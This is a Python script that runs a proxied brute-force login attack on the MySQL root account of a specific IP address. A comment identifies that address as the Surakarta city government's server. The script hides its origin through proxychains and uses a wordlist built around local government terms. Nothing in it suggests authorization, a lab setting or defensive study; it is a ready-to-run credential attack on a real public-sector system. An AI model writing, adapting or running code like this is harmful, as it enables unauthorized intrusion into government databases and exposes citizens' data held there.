
import subprocess, sys

# TARGET CONFIG
target = "103.147.3.81" # surakarta.go.id IP for stability
user = "root"
# Targeted small wordlist for speed via proxy
passwords = [
    "root", "admin", "123456", "password", "surakarta", "surakarta2024", 
    "surakarta2025", "merdeka", "pemerintah", "dinkes", "diskominfo",
    "root123", "admin123", "surakartakota", "kotasurakarta"
]

print(f"[*] Starting MySQL Brute Force for {user} on {target} via Proxychains...")

for p in passwords:
    # Use subprocess to call proxychains + mysql
    # We use -N to avoid interactive prompt and just check the exit code
    cmd = ["proxychains", "mysql", "-h", target, "-u", user, f"-p{p}", "-e", "quit", "--skip-ssl"]
    try:
        # Note: mysql returns 0 on success, non-zero on fail
        process = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if process.returncode == 0:
            print(f"\n[+] SUCCESS! Password found: {p}")
            sys.exit(0)
        
        # Check for access denied vs connection error
        if "Access denied" in process.stderr:
             print(f"\r[*] Testing: {p} (Denied)   ", end="")
        else:
             print(f"\n[!] Connection Error with {p}: {process.stderr.strip()}")
             
    except Exception as e:
        print(f"\n[!] Script Error: {e}")

print("\n[-] Finished. No common password found.")
